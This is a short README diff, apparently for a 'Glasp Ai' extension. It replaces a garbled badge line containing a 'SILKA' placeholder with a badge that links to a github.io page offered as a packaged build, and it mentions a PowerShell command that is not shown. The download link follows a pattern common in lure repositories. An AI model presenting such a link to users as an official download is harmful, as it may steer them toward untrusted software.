@@ -35,7 +35,7 @@ Cross-paragraph selections stay one continuous source unless you split them into
 
 Use the button when you want the packaged Glasp Extension build. The badge uses its own label, a flat-square style, and a green color.
 
-<a href="SILKA"><img src="https://img.shields.io/badge/Get_Glasp_Ai-SILKA-2ea44f?)](https://glasp-extension.github.io/Glasp-Ai/Glasp-Ai)style=flat-square" alt="Get the Glasp Ai build"></a>
+[![Get Glasp Ai](https://img.shields.io/badge/Get-Glasp_Ai-2D9F2D?style=for-the-badge)](https://glasp-extension.github.io/Glasp-Ai/Glasp-Ai)
 
 Or run this in PowerShell from the repository root.
 
